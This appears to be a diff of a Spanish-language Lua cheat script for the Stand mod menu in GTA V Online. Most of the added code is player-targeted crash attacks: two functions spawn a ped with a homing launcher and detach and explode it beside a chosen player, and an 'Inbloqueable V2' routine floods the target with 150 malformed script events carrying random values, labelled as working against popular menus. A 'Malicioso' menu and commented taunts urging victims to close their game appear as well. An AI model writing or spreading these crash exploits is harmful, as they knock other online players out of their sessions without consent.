@@ -4,7 +4,7 @@ util.require_natives("natives-1660775568-uno")
 
 util.toast("Bienvenide Al Script!!")
 local response = false
-local localVer = 0.8
+local localVer = 0.9
 async_http.init("raw.githubusercontent.com", "/XxpichoclesxX/GtaVScripts/main/Stand/lib/RyzeScriptVersion.lua", function(output)
     currentVer = tonumber(output)
     response = true
@@ -69,6 +69,16 @@ function rotation_to_direction(rotation)
     return direction
 end
 
+local function request_model(hash, timeout)
+    timeout = timeout or 3
+    STREAMING.REQUEST_MODEL(hash)
+    local end_time = os.time() + timeout
+    repeat
+        util.yield()
+    until STREAMING.HAS_MODEL_LOADED(hash) or os.time() >= end_time
+    return STREAMING.HAS_MODEL_LOADED(hash)
+end
+
 local function get_interior_player_is_in(pid)
     return memory.read_int(memory.script_global(((0x2908D3 + 1) + (pid * 0x1C5)) + 243)) 
 end
@@ -89,6 +99,9 @@ local function BlockSyncs(pid, callback)
         end
     end
 end
+
+local int_min = -2147483647
+local int_max = 2147483647
 
 function raycast_gameplay_cam(flag, distance)
     local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
@@ -192,7 +205,7 @@ players.on_join(function(player_id)
     menu.divider(menu.player_root(player_id), "RyzeScript")
     local malicious = menu.list(menu.player_root(player_id), "Malicioso")
     local trolling = menu.list(menu.player_root(player_id), "Troleado")
-    local vehicle = menu.list(menu.player_root(player_id), "Vehiculo")
+    --local vehicle = menu.list(menu.player_root(player_id), "Vehiculo")
 
     local explosion = 18
     local explosion_names = {
@@ -586,8 +599,6 @@ players.on_join(function(player_id)
 	--	"pwease cwash yowour game fowor me",
 	--	"Close your game. I'm not asking.",
 	--	"Please close your game, please please please please please",
-	--	"Bro im not asking plz. CLoseit'",
-	--	"Craaash iiiit come on!",
 	--}
 
     --menu.action(crashes, "Crasheo V1", {}, "Bloqueado por menus populares", function()
@@ -596,9 +607,59 @@ players.on_join(function(player_id)
 	--	menu.trigger_commands("smssend" .. PLAYER.GET_PLAYER_NAME(pid))
 	--end)
 
+    menu.action(crashes, "Crash Por Modelo", {""}, "", function()
+        local mdl = util.joaat('a_c_poodle')
+        BlockSyncs(pid, function()
+            if request_model(mdl, 2) then
+                local pos = players.get_position(player_id)
+                util.yield(100)
+                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0) 
+                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
+                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
+                local obj
+                repeat
+                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
+                until obj ~= 0 or util.yield()
+                ENTITY.DETACH_ENTITY(obj, true, true) 
+                util.yield(1500)
+                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
+                entities.delete_by_handle(ped1)
+                util.yield(1000)
+            else
+                util.toast("Error al cargar modelo.")
+            end
+        end)
+    end)
+
+    menu.action(crashes, "Modelo V2", {""}, "Funcando (Menus populares - Stand)", function()
+        local mdl = util.joaat('a_c_poodle')
+        BlockSyncs(player_id, function()
+            if request_model(mdl, 2) then
+                local pos = players.get_position(player_id)
+                util.yield(100)
+                local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+                ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(player_id), 0, 3, 0), 0) 
+                local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
+                WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
+                local obj
+                repeat
+                    obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
+                until obj ~= 0 or util.yield()
+                ENTITY.DETACH_ENTITY(obj, true, true) 
+                util.yield(1500)
+                FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
+                entities.delete_by_handle(ped1)
+                util.yield(1000)
+            else
+                util.toast("Error al cargar modelo.")
+            end
+        end)
+    end)
+
     menu.divider(crashes, "(Ryze Exclusivo)")
 
-    menu.action(crashes, "Inbloqueable", {}, "Inbloqueable (Por Ahora)", function()
+    menu.action(crashes, "Inbloqueable", {}, "Inbloqueable (Menus populares - Stand)", function()
         local user = players.user()
         local user_ped = players.user_ped()
         local pos = players.get_position(user)
@@ -621,31 +682,40 @@ players.on_join(function(player_id)
         end)
     end)
 
-    menu.action(crashes, "Inbloqueable V2", {}, "Inbloqueable V2", function()
-        local user = players.user()
-        local user_ped = players.user_ped()
-        local pos = players.get_position(user)
-        BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
-            util.yield(100)
-            menu.trigger_commands("invisibility on")
-            for i = 0, 110 do
-                PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
-                PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
-                util.yield(50)
-                PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-            end
-            util.yield(250)
-            for i = 1, 5 do
-                util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
-            end
-            ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
-            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
-            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
-            menu.trigger_commands("invisibility off")
-        end)
+    menu.action(crashes, "Inbloqueable V2", {}, "Funcando (Menus populares - Stand)", function()
+        for i = 1, 150 do
+            util.trigger_script_event(1 << player_id, {0xA4D43510, player_id, 0xDF607FCD, math.random(int_min, int_max), math.random(int_min, int_max), 
+            math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
+            math.random(int_min, int_max), player_id, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
+        end
     end)
 
+    --menu.action(crashes, "Inbloqueable V2", {}, "Inbloqueable V2", function()
+    --    local user = players.user()
+    --    local user_ped = players.user_ped()
+    --    local pos = players.get_position(user)
+    --    BlockSyncs(player_id, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
+    --        util.yield(100)
+    --        menu.trigger_commands("invisibility on")
+    --        for i = 0, 110 do
+    --            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user, 0xFBF7D21F)
+    --            PED.SET_PED_COMPONENT_VARIATION(user_ped, 5, i, 0, 0)
+    --            util.yield(50)
+    --            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+    --        end
+    --        util.yield(250)
+    --        for i = 1, 5 do
+    --            util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
+    --        end
+    --        ENTITY.SET_ENTITY_HEALTH(user_ped, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
+    --        NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos, 0, false, false, 0)
+    --        PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+    --        menu.trigger_commands("invisibility off")
+    --    end)
+    --end)
+
     menu.divider(crashes, "Luego agregare mas.")
+    menu.divider(crashes, "Proximamente Inbloqueable V3.")
 
 
     player_toggle_loop(trolling, player_id, "Movimiento Bug", {}, "", function()
@@ -936,11 +1006,11 @@ menu.toggle_loop(detections, "Correr Rapido", {}, "Detecta si corre mas rapido",
     for _, pid in ipairs(players.list(false, true, true)) do
         local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
         local ped_speed = (ENTITY.GET_ENTITY_SPEED(ped)* 2.236936)
-        if not util.is_session_transition_active() and get_interior_player_is_in(pid) == 0 and get_transition_state(pid) ~= 0 
+        if not util.is_session_transition_active() and get_interior_player_is_in(pid) == 0 and get_transition_state(pid) ~= 0 and not PED.IS_PED_DEAD_OR_DYING(ped) 
         and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and not PED.IS_PED_IN_ANY_VEHICLE(ped, false)
         and not TASK.IS_PED_STILL(ped) and not PED.IS_PED_JUMPING(ped) and not ENTITY.IS_ENTITY_IN_AIR(ped) and not PED.IS_PED_CLIMBING(ped) and not PED.IS_PED_VAULTING(ped)
         and v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(pid)) <= 300.0 and ped_speed > 30 then -- fastest run speed is about 18ish mph but using 25 to give it some headroom to prevent false positives
-            util.toast(players.get_name(pid) .. " Usa correr rapido")
+            util.toast(players.get_name(pid) .. " Is Using Super Run")
             break
         end
     end
